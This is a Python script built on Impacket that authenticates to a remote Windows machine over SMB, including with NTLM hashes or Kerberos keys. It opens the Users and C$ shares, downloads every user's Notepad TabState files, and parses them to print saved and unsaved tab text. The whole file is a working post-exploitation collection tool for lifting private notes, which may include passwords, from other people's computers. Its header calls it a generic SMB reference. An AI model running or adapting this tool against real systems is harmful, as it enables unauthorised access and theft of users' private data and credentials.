#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2023 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Reference for:
#   SMB DCE/RPC
#

# Note any output you get from ls() is formatted as a list [(filename, isdir), (filename, isdir)] if isdir == 16 then it is a directory but if its 0 then its a file

from __future__ import division
from __future__ import print_function
from io import BytesIO
import time
import cmd
import os

from six import PY2
from impacket.dcerpc.v5 import samr, transport, srvs
from impacket.dcerpc.v5.dtypes import NULL
from impacket import LOG
from impacket.smbconnection import SMBConnection, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SessionError, \
    FILE_READ_DATA, FILE_SHARE_READ, FILE_SHARE_WRITE
from impacket.smb3structs import FILE_DIRECTORY_FILE, FILE_LIST_DIRECTORY

import charset_normalizer as chardet

import sys
import logging
import argparse
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.examples.smbclient import MiniImpacketShell
from impacket import version
from impacket.smbconnection import SMBConnection
import ntpath

color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_BLU = '\033[94m'
color_PURP = '\033[35m'
color_reset = '\033[0m'
green_plus = '{}[+]{}'.format(color_GRE, color_reset)
red_minus = '{}[-]{}'.format(color_RED, color_reset)
yellow_minus = '{}[-]{}'.format(color_YELL, color_reset)
gold_plus = '{}[+]{}'.format(color_YELL, color_reset)
blue_plus = '{}[+]{}'.format(color_BLU, color_reset)

gotten_files = []
file_names = []

def parse_data(fname):
    # note this code is made by john hammond
    print('\n{} Parsing {}'.format(blue_plus, fname))
    with open(fname, 'rb') as f:
        dat = f.read()

        magic_bytes = dat[0:3]
        is_file_saved = dat[3]
        print(f"{is_file_saved=}")
        if is_file_saved:
            file_name_len = dat[4]
            filename_ending = 5+file_name_len*2
            if logging.getLogger().level == logging.DEBUG:
                print(f"{file_name_len=}")
            orig_filename = dat[5:5+file_name_len*2].decode('utf-16')
            print('Filename={}'.format(orig_filename))

            delimeter_start = dat[filename_ending:].index(b"\x00\x01")
            delimeter_end = dat[filename_ending:].index(b"\x01\x00\x00\x00")
            delimeter_start += filename_ending
            delimeter_end += filename_ending
            file_marker = dat[delimeter_start+2:delimeter_end]
            file_marker = file_marker[:len(file_marker)//2]
            file_contents = dat[delimeter_end+4+len(file_marker):-5].decode('utf-16')
            print('File Contents={}'.format(file_contents))
        else:
            filename_ending = 0
            delimeter_start = dat[filename_ending:].index(b"\x00\x01")
            delimeter_end = dat[filename_ending:].index(b"\x01\x00\x00\x00")
            delimeter_start += filename_ending
            delimeter_end += filename_ending
            file_marker = dat[delimeter_start + 2:delimeter_end]
            file_marker = file_marker[:len(file_marker) // 2]
            file_contents = dat[delimeter_end + 4 + len(file_marker):-5].decode('utf-16')
            print('File Contents={}'.format(file_contents))



def list_smb_shares(smbClient):
    shares = []
    resp = smbClient.listShares()
    for i in range(len(resp)):
        shares.append(resp[i]['shi1_netname'][:-1])
    return shares

def ls(tid, pwd, wildcard, smbClient, share, display=True):
    if tid is None:
        LOG.error("No share selected")
        return
    if wildcard == '':
        pwd = ntpath.join(pwd, '*')
    else:
        pwd = ntpath.join(pwd, wildcard)
    completion = []
    pwd = pwd.replace('/', '\\')
    pwd = ntpath.normpath(pwd)
    for f in smbClient.listPath(share, pwd):
        #if display is True:
            #print("%crw-rw-rw- %10d  %s %s" % ('d' if f.is_directory() > 0 else '-', f.get_filesize(), time.ctime(float(f.get_mtime_epoch())), f.get_longname()))
        completion.append((f.get_longname(), f.is_directory()))
    return completion

def use_smb_share(line, smbClient):
    share = line
    tid = smbClient.connectTree(line)
    pwd = '\\'
    ls(tid, pwd, '', smbClient, share, False)
    return tid, pwd, share

def get_file(tid, pwd, smbClient, share, filename):
    if tid is None:
        LOG.error("No share selected")
        return
    if filename == '.' or filename == '..':
        return
    filename = filename.replace('/', '\\')
    fh = open(ntpath.basename(filename), 'wb')
    pathname = ntpath.join(pwd, filename)
    try:
        smbClient.getFile(share, pathname, fh.write)
    except:
        fh.close()
        os.remove(filename)
        raise
    fh.close()

def main():
    # Init the example's logger theme
    logger.init()
    print(version.BANNER)
    parser = argparse.ArgumentParser(add_help = True, description = "SMB client implementation.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    try:
        smbClient = SMBConnection(address, options.target_ip, sess_port=int(options.port))
        if options.k is True:
            smbClient.kerberosLogin(username, password, domain, lmhash, nthash, options.aesKey, options.dc_ip )
        else:
            smbClient.login(username, password, domain, lmhash, nthash)

        open_shares = ['Users', 'C$']
        for open_share in open_shares:
            print('')
            try:

                print('{} Attempting to access share "{}"'.format(blue_plus, open_share))
                tid, pwd, share = use_smb_share(open_share, smbClient)

            except Exception as e:
                if str(e).find('STATUS_ACCESS_DENIED') != -1:
                    print('{} Cannot Access Share "{}"'.format(red_minus, open_share))
                    continue
                elif str(e).find('STATUS_BAD_NETWORK_NAME') != -1:
                    print('{} Share "{}" does not exist'.format(red_minus, open_share))
                    continue
                else:
                    import traceback
                    traceback.print_exc()
                    print(str(e))
                    continue
            else:

                print('{} Share "{}" was successfully mounted'.format(blue_plus, open_share))
                if open_share == 'Users':
                    if logging.getLogger().level == logging.DEBUG:
                        print('{} We have the Users share'.format(blue_plus))
                        print('{} Attempting to ls the Users folder'.format(blue_plus))
                    all_files_in_shares_root = ls(tid, pwd, '', smbClient, share) # get a files in the root folder for the share
                    if logging.getLogger().level == logging.DEBUG:
                        print('{} Successfully lsed the Users folder'.format(blue_plus))
                    for i in range(len(all_files_in_shares_root)): # iterate through each file/folder
                        if all_files_in_shares_root[i][1] == 16: # if it is a directory it will == 16 so this only check directories
                            if logging.getLogger().level == logging.DEBUG:
                                print('{} "{}" is a directory'.format(blue_plus, all_files_in_shares_root[i][0]))
                            try:
                                if logging.getLogger().level == logging.DEBUG:
                                    print("{} Testing if {} is a directory".format(blue_plus, pwd + all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\'))
                                tabstate_files = ls(tid, pwd + all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\', '', smbClient, share) # try and ls the tabstate dir
                                if logging.getLogger().level == logging.DEBUG:
                                    print("{} {} is a valid directory".format(blue_plus, pwd + all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\'))
                                if len(tabstate_files)-2 > 0: # if there are tabstate files
                                    if logging.getLogger().level == logging.DEBUG:
                                        print('{} tabstate_files is > 0'.format(blue_plus))
                                    for j in range(len(tabstate_files)): # iterate through each one
                                        try:
                                            if tabstate_files[j][0].endswith('.1.bin') or tabstate_files[j][0].endswith('.0.bin') or not tabstate_files[j][0].endswith('.bin'): # only gets .bin not .0.bin or .1.bin and make sure it is a .bin file
                                                continue
                                            if logging.getLogger().level == logging.DEBUG:
                                                print('{} File {} ends with .bin'.format(blue_plus, tabstate_files[j][0]))
                                            if all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\' + tabstate_files[j][0] not in gotten_files:
                                                if logging.getLogger().level == logging.DEBUG:
                                                    print('{} File {} is not in gotten_files'.format(blue_plus, all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\' + tabstate_files[j][0]))
                                                    print('{} Getting File {}'.format(blue_plus, tabstate_files[j][0]))
                                                get_file(tid, pwd + all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\', smbClient, share, tabstate_files[j][0])
                                                gotten_files.append(all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\' + tabstate_files[j][0])
                                                file_names.append(tabstate_files[j][0]) # we use this to read the local files later

                                                print('{} Got File {}'.format(blue_plus, tabstate_files[j][0]))
                                            elif logging.getLogger().level == logging.DEBUG:
                                                print('{} File {} already in gotten_files, skipping'.format(yellow_minus, all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\' + tabstate_files[j][0]))
                                        except Exception as e:
                                            if str(e).find('[Errno 13] Permission denied') != -1:
                                                import traceback
                                                traceback.print_exc()
                                                print('{} Cannot write file locally (you probably need to run the tool as sudo)'.format(red_minus))
                                                continue
                                            elif str(e).find('STATUS_SHARING_VIOLATION') != -1:
                                                if logging.getLogger().level == logging.DEBUG:
                                                    print('{} Cannot get file due to sharing violation (they likely have notepad open)'.format(red_minus))
                                                continue
                                            else:
                                                print(str(e))
                                                import traceback
                                                traceback.print_exc()
                                                continue

                            except Exception as e:
                                if str(e).find('STATUS_OBJECT_PATH_NOT_FOUND') != -1:
                                    if logging.getLogger().level == logging.DEBUG:
                                        print('{} {} not found'.format(red_minus, pwd + all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\'))
                                    continue
                                elif str(e).find('STATUS_STOPPED_ON_SYMLINK') != -1:
                                    if logging.getLogger().level == logging.DEBUG:
                                        print('{} Hit a symlink file skipping this guy'.format(red_minus))
                                    continue

                                else:
                                    print(str(e))
                                    import traceback
                                    traceback.print_exc()
                                    continue

                elif open_share == 'C$':
                    pwd = pwd+'Users\\'
                    if logging.getLogger().level == logging.DEBUG:
                        print('{} We have the C$ share'.format(blue_plus))
                        print('{} Attempting to ls the C$\\Users folder'.format(blue_plus))
                    all_files_in_shares_root = ls(tid, pwd, '', smbClient, share)  # get a files in the root folder for the share
                    if logging.getLogger().level == logging.DEBUG:
                        print('{} Successfully lsed the C$\\Users folder'.format(blue_plus))
                    for i in range(len(all_files_in_shares_root)):  # iterate through each file/folder
                        if all_files_in_shares_root[i][1] == 16:  # if it is a directory it will == 16 so this only check directories
                            if logging.getLogger().level == logging.DEBUG:
                                print('{} "{}" is a directory'.format(blue_plus, all_files_in_shares_root[i][0]))
                            try:
                                if logging.getLogger().level == logging.DEBUG:
                                    print("{} Testing if {} is a directory".format(blue_plus, pwd + all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\'))
                                tabstate_files = ls(tid, pwd + all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\', '', smbClient, share)  # try and ls the tabstate dir
                                if logging.getLogger().level == logging.DEBUG:
                                    print("{} {} is a valid directory".format(blue_plus, pwd + all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\'))
                                if len(tabstate_files) > 0:  # if there are tabstate files
                                    if logging.getLogger().level == logging.DEBUG:
                                        print('{} tabstate_files is > 0'.format(blue_plus))
                                    for j in range(len(tabstate_files)):  # iterate through each one
                                        try:
                                            if tabstate_files[j][0].endswith('.1.bin') or tabstate_files[j][0].endswith('.0.bin') or not tabstate_files[j][0].endswith('.bin'):  # only gets .bin not .0.bin or .1.bin and make sure it is a .bin file
                                                continue
                                            if logging.getLogger().level == logging.DEBUG:
                                                print('{} File {} ends with .bin'.format(blue_plus, tabstate_files[j][0]))
                                            if all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\' + tabstate_files[j][0] not in gotten_files:
                                                if logging.getLogger().level == logging.DEBUG:
                                                    print('{} File {} is not in gotten_files'.format(blue_plus, all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\' + tabstate_files[j][0]))
                                                    print('{} Getting File {}'.format(blue_plus, tabstate_files[j][0]))
                                                get_file(tid, pwd + all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\', smbClient, share, tabstate_files[j][0])
                                                gotten_files.append(all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\' + tabstate_files[j][0])
                                                file_names.append(tabstate_files[j][0]) # we use this to read the local files later
                                                print('{} Got File {}'.format(blue_plus, tabstate_files[j][0]))
                                            elif logging.getLogger().level == logging.DEBUG:
                                                print('{} File {} already in gotten_files, skipping'.format(yellow_minus, all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\' + tabstate_files[j][0]))
                                        except Exception as e:
                                            if str(e).find('[Errno 13] Permission denied') != -1:
                                                import traceback
                                                traceback.print_exc()
                                                print('{} Cannot write file locally (you probably need to run the tool as sudo)'.format(red_minus))
                                                continue
                                            elif str(e).find('STATUS_SHARING_VIOLATION') != -1:
                                                if logging.getLogger().level == logging.DEBUG:
                                                    print('{} Cannot get file due to sharing violation (they likely have notepad open)'.format(red_minus))
                                                continue
                                            else:
                                                print(str(e))
                                                import traceback
                                                traceback.print_exc()
                                                continue

                            except Exception as e:
                                if str(e).find('STATUS_OBJECT_PATH_NOT_FOUND') != -1:
                                    if logging.getLogger().level == logging.DEBUG:
                                        print('{} {} not found'.format(red_minus, pwd + all_files_in_shares_root[i][0] + '\\AppData\\Local\\Packages\\Microsoft.WindowsNotepad_8wekyb3d8bbwe\\LocalState\\TabState\\'))
                                    continue
                                elif str(e).find('STATUS_STOPPED_ON_SYMLINK') != -1:
                                    if logging.getLogger().level == logging.DEBUG:
                                        print('{} Hit a symlink file skipping this guy'.format(red_minus))
                                    continue
                                elif str(e).find('[Errno 13] Permission denied') != -1:
                                    import traceback
                                    traceback.print_exc()
                                    print('{} Cannot write file locally (you probably need to run the tool as sudo)'.format(red_minus))
                                    pass
                                elif str(e).find('STATUS_SHARING_VIOLATION') != -1:
                                    if logging.getLogger().level == logging.DEBUG:
                                        print('{} Cannot get file due to sharing violation (they likely have notepad open)'.format(red_minus))
                                    continue
                                else:
                                    print(str(e))
                                    import traceback
                                    traceback.print_exc()
                                    continue


    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
    else: # so we dont try and logoff if an error occurred
        # done with smb so we logoff now
        if logging.getLogger().level == logging.DEBUG:
            print('{} Logging off of SMB now'.format(blue_plus))
        smbClient.logoff()

    for file in file_names:
        parse_data(file)

if __name__ == "__main__":
    main()
